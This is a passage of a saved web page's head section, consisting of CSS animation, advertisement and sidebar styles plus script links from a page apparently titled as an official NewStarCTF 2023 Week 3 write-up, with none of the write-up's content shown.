            transform: translate3d(0, -5px, 0); }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@-webkit-keyframes Toastify__bounceOutUp {
  20% {
    -webkit-transform: translate3d(0, -10px, 0);
            transform: translate3d(0, -10px, 0); }
  40%,
  45% {
    opacity: 1;
    -webkit-transform: translate3d(0, 20px, 0);
            transform: translate3d(0, 20px, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(0, -2000px, 0);
            transform: translate3d(0, -2000px, 0); } }

@keyframes Toastify__bounceOutUp {
  20% {
    -webkit-transform: translate3d(0, -10px, 0);
            transform: translate3d(0, -10px, 0); }
  40%,
  45% {
    opacity: 1;
    -webkit-transform: translate3d(0, 20px, 0);
            transform: translate3d(0, 20px, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(0, -2000px, 0);
            transform: translate3d(0, -2000px, 0); } }

@-webkit-keyframes Toastify__bounceInDown {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  0% {
    opacity: 0;
    -webkit-transform: translate3d(0, -3000px, 0);
            transform: translate3d(0, -3000px, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, 25px, 0);
            transform: translate3d(0, 25px, 0); }
  75% {
    -webkit-transform: translate3d(0, -10px, 0);
            transform: translate3d(0, -10px, 0); }
  90% {
    -webkit-transform: translate3d(0, 5px, 0);
            transform: translate3d(0, 5px, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@keyframes Toastify__bounceInDown {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  0% {
    opacity: 0;
    -webkit-transform: translate3d(0, -3000px, 0);
            transform: translate3d(0, -3000px, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, 25px, 0);
            transform: translate3d(0, 25px, 0); }
  75% {
    -webkit-transform: translate3d(0, -10px, 0);
            transform: translate3d(0, -10px, 0); }
  90% {
    -webkit-transform: translate3d(0, 5px, 0);
            transform: translate3d(0, 5px, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@-webkit-keyframes Toastify__bounceOutDown {
  20% {
    -webkit-transform: translate3d(0, 10px, 0);
            transform: translate3d(0, 10px, 0); }
  40%,
  45% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
            transform: translate3d(0, -20px, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(0, 2000px, 0);
            transform: translate3d(0, 2000px, 0); } }

@keyframes Toastify__bounceOutDown {
  20% {
    -webkit-transform: translate3d(0, 10px, 0);
            transform: translate3d(0, 10px, 0); }
  40%,
  45% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
            transform: translate3d(0, -20px, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(0, 2000px, 0);
            transform: translate3d(0, 2000px, 0); } }

.Toastify__bounce-enter--top-left, .Toastify__bounce-enter--bottom-left {
  -webkit-animation-name: Toastify__bounceInLeft;
          animation-name: Toastify__bounceInLeft; }

.Toastify__bounce-enter--top-right, .Toastify__bounce-enter--bottom-right {
  -webkit-animation-name: Toastify__bounceInRight;
          animation-name: Toastify__bounceInRight; }

.Toastify__bounce-enter--top-center {
  -webkit-animation-name: Toastify__bounceInDown;
          animation-name: Toastify__bounceInDown; }

.Toastify__bounce-enter--bottom-center {
  -webkit-animation-name: Toastify__bounceInUp;
          animation-name: Toastify__bounceInUp; }

.Toastify__bounce-exit--top-left, .Toastify__bounce-exit--bottom-left {
  -webkit-animation-name: Toastify__bounceOutLeft;
          animation-name: Toastify__bounceOutLeft; }

.Toastify__bounce-exit--top-right, .Toastify__bounce-exit--bottom-right {
  -webkit-animation-name: Toastify__bounceOutRight;
          animation-name: Toastify__bounceOutRight; }

.Toastify__bounce-exit--top-center {
  -webkit-animation-name: Toastify__bounceOutUp;
          animation-name: Toastify__bounceOutUp; }

.Toastify__bounce-exit--bottom-center {
  -webkit-animation-name: Toastify__bounceOutDown;
          animation-name: Toastify__bounceOutDown; }

@-webkit-keyframes Toastify__zoomIn {
  from {
    opacity: 0;
    -webkit-transform: scale3d(0.3, 0.3, 0.3);
            transform: scale3d(0.3, 0.3, 0.3); }
  50% {
    opacity: 1; } }

@keyframes Toastify__zoomIn {
  from {
    opacity: 0;
    -webkit-transform: scale3d(0.3, 0.3, 0.3);
            transform: scale3d(0.3, 0.3, 0.3); }
  50% {
    opacity: 1; } }

@-webkit-keyframes Toastify__zoomOut {
  from {
    opacity: 1; }
  50% {
    opacity: 0;
    -webkit-transform: scale3d(0.3, 0.3, 0.3);
            transform: scale3d(0.3, 0.3, 0.3); }
  to {
    opacity: 0; } }

@keyframes Toastify__zoomOut {
  from {
    opacity: 1; }
  50% {
    opacity: 0;
    -webkit-transform: scale3d(0.3, 0.3, 0.3);
            transform: scale3d(0.3, 0.3, 0.3); }
  to {
    opacity: 0; } }

.Toastify__zoom-enter {
  -webkit-animation-name: Toastify__zoomIn;
          animation-name: Toastify__zoomIn; }

.Toastify__zoom-exit {
  -webkit-animation-name: Toastify__zoomOut;
          animation-name: Toastify__zoomOut; }

@-webkit-keyframes Toastify__flipIn {
  from {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    -webkit-animation-timing-function: ease-in;
            animation-timing-function: ease-in;
    opacity: 0; }
  40% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    -webkit-animation-timing-function: ease-in;
            animation-timing-function: ease-in; }
  60% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
    opacity: 1; }
  80% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -5deg); }
  to {
    -webkit-transform: perspective(400px);
            transform: perspective(400px); } }

@keyframes Toastify__flipIn {
  from {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    -webkit-animation-timing-function: ease-in;
            animation-timing-function: ease-in;
    opacity: 0; }
  40% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    -webkit-animation-timing-function: ease-in;
            animation-timing-function: ease-in; }
  60% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
    opacity: 1; }
  80% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -5deg); }
  to {
    -webkit-transform: perspective(400px);
            transform: perspective(400px); } }

@-webkit-keyframes Toastify__flipOut {
  from {
    -webkit-transform: perspective(400px);
            transform: perspective(400px); }
  30% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    opacity: 1; }
  to {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    opacity: 0; } }

@keyframes Toastify__flipOut {
  from {
    -webkit-transform: perspective(400px);
            transform: perspective(400px); }
  30% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    opacity: 1; }
  to {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    opacity: 0; } }

.Toastify__flip-enter {
  -webkit-animation-name: Toastify__flipIn;
          animation-name: Toastify__flipIn; }

.Toastify__flip-exit {
  -webkit-animation-name: Toastify__flipOut;
          animation-name: Toastify__flipOut; }

@-webkit-keyframes Toastify__slideInRight {
  from {
    -webkit-transform: translate3d(110%, 0, 0);
            transform: translate3d(110%, 0, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@keyframes Toastify__slideInRight {
  from {
    -webkit-transform: translate3d(110%, 0, 0);
            transform: translate3d(110%, 0, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@-webkit-keyframes Toastify__slideInLeft {
  from {
    -webkit-transform: translate3d(-110%, 0, 0);
            transform: translate3d(-110%, 0, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@keyframes Toastify__slideInLeft {
  from {
    -webkit-transform: translate3d(-110%, 0, 0);
            transform: translate3d(-110%, 0, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@-webkit-keyframes Toastify__slideInUp {
  from {
    -webkit-transform: translate3d(0, 110%, 0);
            transform: translate3d(0, 110%, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@keyframes Toastify__slideInUp {
  from {
    -webkit-transform: translate3d(0, 110%, 0);
            transform: translate3d(0, 110%, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@-webkit-keyframes Toastify__slideInDown {
  from {
    -webkit-transform: translate3d(0, -110%, 0);
            transform: translate3d(0, -110%, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@keyframes Toastify__slideInDown {
  from {
    -webkit-transform: translate3d(0, -110%, 0);
            transform: translate3d(0, -110%, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@-webkit-keyframes Toastify__slideOutRight {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(110%, 0, 0);
            transform: translate3d(110%, 0, 0); } }

@keyframes Toastify__slideOutRight {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(110%, 0, 0);
            transform: translate3d(110%, 0, 0); } }

@-webkit-keyframes Toastify__slideOutLeft {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(-110%, 0, 0);
            transform: translate3d(-110%, 0, 0); } }

@keyframes Toastify__slideOutLeft {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(-110%, 0, 0);
            transform: translate3d(-110%, 0, 0); } }

@-webkit-keyframes Toastify__slideOutUp {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, 110%, 0);
            transform: translate3d(0, 110%, 0); } }

@keyframes Toastify__slideOutUp {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, 110%, 0);
            transform: translate3d(0, 110%, 0); } }

@-webkit-keyframes Toastify__slideOutDown {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, -110%, 0);
            transform: translate3d(0, -110%, 0); } }

@keyframes Toastify__slideOutDown {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, -110%, 0);
            transform: translate3d(0, -110%, 0); } }

.Toastify__slide-enter--top-left, .Toastify__slide-enter--bottom-left {
  -webkit-animation-name: Toastify__slideInLeft;
          animation-name: Toastify__slideInLeft; }

.Toastify__slide-enter--top-right, .Toastify__slide-enter--bottom-right {
  -webkit-animation-name: Toastify__slideInRight;
          animation-name: Toastify__slideInRight; }

.Toastify__slide-enter--top-center {
  -webkit-animation-name: Toastify__slideInDown;
          animation-name: Toastify__slideInDown; }

.Toastify__slide-enter--bottom-center {
  -webkit-animation-name: Toastify__slideInUp;
          animation-name: Toastify__slideInUp; }

.Toastify__slide-exit--top-left, .Toastify__slide-exit--bottom-left {
  -webkit-animation-name: Toastify__slideOutLeft;
          animation-name: Toastify__slideOutLeft; }

.Toastify__slide-exit--top-right, .Toastify__slide-exit--bottom-right {
  -webkit-animation-name: Toastify__slideOutRight;
          animation-name: Toastify__slideOutRight; }

.Toastify__slide-exit--top-center {
  -webkit-animation-name: Toastify__slideOutUp;
          animation-name: Toastify__slideOutUp; }

.Toastify__slide-exit--bottom-center {
  -webkit-animation-name: Toastify__slideOutDown;
          animation-name: Toastify__slideOutDown; }</style><style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style><style type="text/css" data-styled-components="jqVHLt iyLjmU" data-styled-components-is-local="true">
/* sc-component-id: sc-cmTdod */

.jqVHLt{white-space:nowrap;}
/* sc-component-id: sc-jwKygS */

.iyLjmU{display:inline-block;font-size:12px;margin-left:10px;color:white;cursor:pointer;}.iyLjmU::before{content:'✕';}</style><style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style><style id="sm-ad-style-container">
  .sm-ad-wrapper {
    display: none;
  }
  .sm-ad-container {
    position: relative;
    height: 0;
    overflow: hidden;
  }
  .sm-ad-container a {
    display: block;
    width: 100%;
    height: 100%;
  }
  @keyframes fadeIn {
    from {
      opacity: 0.3;
    }
    to {
      opacity: 1;
     }
  }

  @keyframes fadeOut {
    from {
      opacity: 1;
     }
    to {
      opacity: 0;
     }
  }

  @-webkit-keyframes fadeIn {
    from {
      opacity: 0.3;
    }
    to {
      opacity: 1;
     }
  }

  @keyframes cardEaseIn {
    from {
      opacity: 0.3;
      top: 50px;
    }
    to {
      opacity: 1;
      top: 0;
     }
  }
  @-webkit-keyframes cardEaseIn {
    from {
      opacity: 0.3;
      top: 50px;
    }
    to {
      opacity: 1;
      top: 0;
     }
  }

  .sm-ad-item {
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    display: block;
  }
  .sm-ad-img {
    display: block;
    max-width: 100%;
    min-width: 100%;
    height: 100%;
  }
  .ad-price {
    cursor: pointer;
    position: absolute;
    bottom: 0;
    right: 0;
    font-size: 10px;
    line-height: 1em;
    padding: 4px 12px;
    color: white;
    background-color: rgba(216, 216, 216);
    background-color: rgba(216, 216, 216, 0.3);
    border-top-left-radius: 2px;
  }
  .ad-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 999;
    padding: 3px 7px;
    background-color: rgba(216, 216, 216, 0.3);
    color: white;
    font-size: 14px;
    border-radius: 50%;
  }
  .ad-close:before {
    content: "X";
  }
  .ad-price:before {
    content: "广告";
  }
  .sm-ad-item:hover > .ad-price {
    background-color: rgba(216, 216, 216);
    background-color: rgba(216, 216, 216, 0.5);
  }
  .sm-ad-item:hover > .ad-price:before  {
    content: "升级至无广告版本";
  }
  .sm-ad-mask {
    display: none;
    background-color: rgba(44, 48, 51, 0.4);
    position: absolute;
    top: 0;
    left: 0;
    bottom: 0;
    right: 0;
  }
  .sm-ad-mask button {
    width: 120px;
    height: 35px;
    border-radius: 3px;
    box-shadow: 0px 4px 30px 0px rgba(0,0,0,0.3);
    color: #ffffff;
    font-size: 15px;
    transform: translate(0%, 50%);
  }
  .sm-ad-ever-close {
    background-color: #E1AE6C;
    margin-right: 8px;
    border: none;
  }
  .sm-ad-temporal-close {
    border: 1px solid #FFF;
    background-color: rgba(0,0,0,0.1);
  }

  .sm-ad-card {
    width: 100%;
    position: relative;
    margin: 10px 0;
  }
  .sm-ad-card a {
    text-decoration: none;
  }
  .sm-ad-card .sm-ad-carousel__switcher {
    display: none;
  }
  .sm-ad-card:hover .sm-ad-carousel__switcher {
    display: block;
  }
  .sm-ad-card__close {
    width: 12px;
    height: 12px;
    transform: rotate(45deg);
    color: #cdcdcd;
    position: absolute;
    top: -5px;
    right: -5px;
    font-weight: lighter;
    cursor: pointer;
  }
  .sm-ad-card__close:before {
    content: "+";
    font-size: 20px
  }
  .sm-ad-card__image-wrapper {
    position: relative;
    height: 100%;
  }
  .sm-ad-card__image {
    display: block;
    width: 100%;
    height: 100%;
  }
  .sm-ad-card__label {
    color: white;
    width: 45px;
    height: 22px;
    text-shadow: 0 2px 6px rgba(0, 0, 0, 0.65);
    font-size: 14px;
    transform: scale(0.5);
    transform-origin: top left;
    position: absolute;
    left: 3px;
    top: 2px;
    text-align: center;
  }
  .sm-ad-card__label--dark {
    text-shadow: unset;
    background-color: black;
    transform-origin: bottom right;
    right: 0;
    bottom: 0;
    left: unset;
    top: unset;
    width: 130px;
    height: 30px;
    line-height: 30px;
    color: rgba(255, 255, 255, 0.85);
    cursor: pointer;
  }
  .sm-ad-card__label.sm-ad-card__label--bottom-right,
  .sm-ad-card__label.sm-ad-card__label--top-right {
    width: auto;
    position: absolute;
    color: #fff;
    background-color:#000;
    padding: 4px 12px;
    font-size: 14px;
    line-height: 20px;
    text-shadow: none;
    bottom: 7px;
    left: initial;
    top: initial;
    right: 10px;
    transform-origin: bottom right;
  }
  .sm-ad-card__label.sm-ad-card__label--top-right {
    bottom: initial;
    top: 10px;
    transform-origin: top right;
  }
  .sm-ad-carousel__switcher {
    width: 12px;
    height: 12px;
    position: absolute;
    top: 46%;
    cursor: pointer;
  }
  .sm-ad-carousel__switcher > svg {
    width: 100%;
    height: 100%;
    vertical-align: top;
  }
  .sm-ad-carousel__switcher-right > svg {
    transform: rotateY(180deg);
  }
  .sm-ad-carousel__switcher-left {
    left: 3px;
  }
  .sm-ad-carousel__switcher-right {
    right: 3px;
  }

  .sm-ad-text-link a {
    text-decoration: none;
  }
  .sm-ad-text-link p {
    text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden;
  }

  .sm-ad-shortcut {
    width: 217px;
    height: 30px;
    background-color: #efefef;
    left: -10px;
    cursor: pointer
  }
  .sm-ad-shortcut .sm-ad-card__label {
    width: 48px;
    height: 28px;
    line-height: 28px;
    right: unset;
    bottom: unset;
    top: -5px;
    left: -17px;
  }
  .sm-ad-shortcut p {
    padding-left: 45px;
    font-size: 13px;
    line-height: 1.5;
    color: #7f7f7f;
    padding-top: 6px;
    width: 160px;
  }
  .sm-ad-shortcut .sm-ad-card__close {
    width: 20px;
    height: 20px;
    color: #a5a5a5;
    display: none;
    top: 4px;
    right: -1px;
    font-weight: 200;
  }
  .sm-ad-shortcut:hover .sm-ad-card__close {
    display: block;
  }
  .sm-ad-shortcut .sm-ad-card__close:before {
    font-size: 24px;
  }

  .sm-ad-mobile-link {
    width: 100%;
    height: 16px;
    margin: 15px 0 20px;
  }
  .sm-ad-mobile-link .sm-ad-card__label {
    width: 60px;
    left: -30px;
    font-size: 16px;
  }
  .sm-ad-mobile-link p {
    padding-left: 40px;
    font-size: 14px;
    font-weight: 300;
    line-height: 1;
    color: #41464b;
    width: calc(100% - 40px);
    text-align: left;
  }

  .sm-ad-mobile-card {
    height: 48vw;
    margin: 15px 0;
  }

  .sm-ad-mobile-top-banner {
    transition: height 1s ease 0s;
    height: 88px;
    width: 100%;
    margin: 0;
    position: fixed;
    z-index: 999;
  }

  .sm-ad-mobile-top-banner .sm-ad-card__label--bottom-right {
    bottom: 0;
    right: 0;
    background-color: #000000;
    border: 0;
    color: white;
  }

  .sm-ad-mobile-top-banner .sm-ad-card__label--top-left {
    left: 5px;
    top: 5px;
  }

  .sm-ad-mobile-top-banner .sm-ad-card__close {
    right: 0px;
    top: 0px;
  }

  .sm-ad-mobile-card__button {
    width: 120px !important;
    height: 36px !important;
    min-width: auto;
    position: absolute;
    bottom: 16px;
    left: calc(50% - 60px);
  }

  .sm-ad-mobile-stream-a {
    text-decoration:none;
  }
  .sm-ad-mobile-pic-container .sm-ad-card__close,
  .sm-ad-mobile-mixed-container .sm-ad-card__close {
    width: 14px;
    height: 14px;
    top: 14px;
    right: 14px;
  }
  .sm-ad-mobile-pic-container .sm-ad-card__close:before,
  .sm-ad-mobile-mixed-container .sm-ad-card__close:before {
    font-size: 24px;
    line-height: 10px;
  }
  .tencent-ad.sm-ad-mobile-stream-card__label {
    bottom: 0;
    left: 0;
  }
  .sm-ad-mobile-pic-container .sm-ad-mobile-stream-card__label,
  .sm-ad-mobile-mixed-container .sm-ad-mobile-stream-card__label {
    height: 18px;
    line-height: 18px;
    padding: 0 6px;
    top: 15px;
    left: 15px;
    text-align: center;
    border-radius: 2px;
    background-color: rgba(0,0,0,0.2);
    color: white;
  }
  .sm-ad-mobile-pic-container .sm-ad-mobile-stream-card__upgrade,
  .sm-ad-mobile-mixed-container .sm-ad-mobile-stream-card__upgrade,
  .tencent-ad.sm-ad-mobile-stream-card__upgrade {
    bottom: 0;
    right: 0;
  }
  .sm-ad-mobile-mixed-container .sm-ad-mobile-stream-card__label,
  .sm-ad-mobile-mixed-container .sm-ad-mobile-stream-card__upgrade {
    z-index: 1;
  }
  .sm-ad-mobile-stream-card__label, .sm-ad-mobile-stream-card__upgrade {
    position: absolute;
    color: #41464b;
    font-size: .7em;
    padding: 10px;
    line-height: 10px;
  }
  .sm-ad-mobile-stream-card__label {
    text-align: left;
  }
  .sm-ad-mobile-stream-card__upgrade {
    padding: 3px 6px;
    margin: 6px 10px;
    border: 1px solid #41464b;
    border-radius: 2px;
  }
  .sm-ad-mobile-mixed-container {
    position: relative;
    left: 0px;
    padding: 10px 10px 30px 10px !important;
    background-color: #f8f8f8;
  }
  .sm-ad-mobile-mixed-a {
    position: relative;
    float: left;
    display: flex;
    width: 100%;
  }
  .sm-ad-mobile-mixed-image {
    position: relative;
    float: left;
    flex: none;
  }
  .sm-ad-mobile-mixed-content {
    color: #000;
    line-height: normal;
    letter-spacing: 1.6px;
    background-color: rgb(238, 238, 238);
    display: flex;
    flex-direction: column;
  }
  .sm-ad-mobile-mixed-text {
    flex: auto;
    margin: 12px 9.5px 0 14.5px;
    overflow: hidden;
    font-size: 1em;
  }
  .sm-ad-mobile-mixed-price {
    flex: auto;
    margin-left: 14px;
    letter-spacing: 1.7px;
    overflow: hidden;
    width: calc(100% - 28px);
    font-size: 1em;
    white-space: nowrap;
    text-overflow: ellipsis;
  }
  .sm-ad-mobile-mixed-brandText {
    margin-left: 5px;
    letter-spacing: 1.6px;
    color: #676b6f;
  }
  .sm-ad-mobile-mixed-button {
    margin: 0 0 10.5px 14px;
    width: fit-content;
    max-width: 300px;
    background-color: #41464b;
    color: #fff;
    text-align: center;
    overflow: hidden;
    font-size: .86em;
    padding: .3em 1.2em;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 1;
  }
  .sm-ad-mobile-pic-container {
    position: relative;
    float: left;
    width: 100%;
    padding: 10px 10px 30px 10px !important;
    background-color: #f8f8f8;
  }
  .sm-ad-mobile-pic {
    width: 100%;
  }

  .sm-ad-bottom-card__wrapper {
    position: relative;
    top: -18px;
    left: -4px;
  }
  .sm-ad-bottom-card__wrapper--animation {
    animation: cardEaseIn 1s ease-in-out;
    -webkit-animation: cardEaseIn 1s ease-in-out;
  }
  .sm-ad-bottom-card {
    width: 182px;
    height: 182px;
    position: relative;
    background-size: cover;
    cursor: pointer;
  }
  .sm-ad-bottom-card p {
    font-size: 11px;
    color: white;
  }
  .sm-ad-bottom-card .sm-ad-card__close {
    top: -8px;
    right: -2px;
    color: white;
  }
  .sm-ad-bottom-card .sm-ad-card__close:before {
    font-size: 30px;
  }
  .sm-ad-bottom-card__apron {
    box-sizing: border-box;
    width: 100%;
    height: 44px;
    background-color: rgba(0, 0, 0, 0.1);
    padding: 0 15px;
    position: absolute;
    left: 0;
    bottom: 0;
  }
  .sm-ad-bottom-card__text {
    position: relative;
    display: flex;
    flex-direction: column;
    justify-content: center;
    height: 100%;
    top: -7px;
    line-height: 1.1;
  }
  .sm-ad-bottom-card__text p {
    margin: 0;
  }

  .sm-ad-banner {
    height: 50px;
    max-width: 712px;
  }
  .sm-ad-banner .sm-ad-card__close {
    color: #ccc;
    top: -7px;
  }
  .sm-ad-banner::-webkit-scrollbar {
    width: 0;
    background-color: transparent;
  }
  .sm-ad-banner__image {
    width: 712px;
    height: 50px;
    display: block;
  }

  .sm-ad-container.tencent-ad-container .sm-ad-item,
  .sm-ad-container.with-padding-background .sm-ad-item {
    padding: 10px 10px 30px;
    background: #eee;
  }

  .sm-ad-container.with-padding-background .sm-ad-item {
    box-sizing: border-box;
  }

  .sm-ad-container.with-padding-background.sm-ad-mobile-card .sm-ad-item {
    padding-bottom: 10px;
  }

  .sm-ad-mobile-link .sm-ad-card__label--bordered {
    left: 0;
    top: 0;
    width: auto;
    border: solid 1px #41464b;
    color: #41464b;
    padding: 2px 12px;
    font-size: 14px;
    line-height: 20px;
    text-shadow: none;
  }

  .ad-template {
    position: relative;
    overflow: hidden;
    border-radius: 8px;
    background-color: #eaeef1;
  }
  .ad-template__container {
    display: flex;
    justify-content: space-between;
    height: 240px;
    padding-right: 8px;
  }
  .ad-template__mainColumn {
    display: flex;
    flex-direction: column;
    justify-content: center;
    flex-shrink: 0;
    width: 368px;
    padding: 32px 40px;
  }
  .ad-template__title {
    overflow: hidden;
    font-size: 24px;
    font-weight: 600;
    line-height: 32px;
    white-space: nowrap;
    text-overflow: ellipsis;
    color: #2c3033;
  }
  .ad-template__content {
    overflow: hidden;
    max-height: 72px;
    margin-top: 16px;
    font-size: 16px;
    line-height: 24px;
    white-space: pre-line;
    color: #2c3033;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 3;
  }
  .ad-template__buttons {
    display: flex;
    margin: 16px -12px 0;
  }
  .ad-template__button {
    flex: 1;
    overflow: hidden;
    padding: 0 12px;
  }
  .ad-template__sideColumn {
    flex-shrink: 0;
    padding: 24px 40px 16px;
  }
  .ad-template__image {
    height: 200px;
  }
  .ad-template__close {
    position: absolute;
    right: 16px;
    top: 16px;
    width: 20px;
    height: 20px;
    border-radius: 50%;
    cursor: pointer;
  }
  .ad-template__close > svg {
    display: block;
  }
  .ad-button {
    display: block;
    overflow: hidden;
    box-sizing: border-box;
    height: 40px;
    padding: 7px;
    border: 1px solid;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 500;
    line-height: 24px;
    white-space: nowrap;
    text-overflow: ellipsis;
    text-align: center;
    text-decoration: none;
  }
  .ad-button--primary {
    border-color: #4583d4;
    color: #fff;
    background-image: linear-gradient(#5ba0e7, #4583d4);
  }
  .ad-button--primary:hover {
    background-image: none;
    background-color: #5ba0e7;
  }
  .ad-button--primary:active {
    background-image: none;
    background-color: #4583d4;
  }
  .ad-button--secondary {
    border-color: rgba(65, 70, 75, 0.2);
    color: #4583d4;
    background-image: linear-gradient(#fff, #f6f6f6);
  }
  .ad-button--secondary:hover {
    background-image: none;
    background-color: #fff;
  }
  .ad-button--secondary:active {
    background-image: none;
    background-color: #f6f6f6;
  }
  </style><style type="text/css">.ql-sidebar{display:none;width:340px;max-height:100vh;position:fixed;top:0;right:0;background:#f7f7f7;margin-right:auto;border-bottom:1px solid #d9d9d9;box-shadow:0 1px 6px #ccc;transition:right .2s ease-in}.sm-sidebar{width:100%;height:100%}.sm-sidebar .sm-sidebar-title{margin:0 20px;height:48px;line-height:46px;font-size:12px;border-bottom:1px solid #ddd;position:relative}.sm-sidebar .sm-sidebar-title .title-text{display:inline-block;color:#a5a5a5}.sm-sidebar .sm-sidebar-title .icon-close{width:11px;height:11px;margin:7px;color:#888;position:absolute;line-height:12px;right:0;top:10px}.sm-sidebar .sm-sidebar-title .icon-close svg path{fill:#c6c6c6}.sm-sidebar .sm-sidebar-title .icon-close svg:hover{cursor:pointer}.sm-sidebar .sm-sidebar-title .icon-close svg:hover path{fill:#5d5d5d}.sm-sidebar .sm-sidebar-body{height:calc(100% - 48px)}</style><style id="folding-style"></style><script charset="utf-8" src="./NewStarCTF 2023 Week3 官方WriteUp_files/chunk-vendors~toc-377cb46587.js.下载"></script><link rel="stylesheet" type="text/css" href="./NewStarCTF 2023 Week3 官方WriteUp_files/toc-f9d6f63f12.css"><script charset="utf-8" src="./NewStarCTF 2023 Week3 官方WriteUp_files/chunk-toc-a4ae2c29e2.js.下载"></script><script charset="utf-8" src="./NewStarCTF 2023 Week3 官方WriteUp_files/chunk-vendors~hljs-b064a46f4c.js.下载"></script></head>
    <body class="">
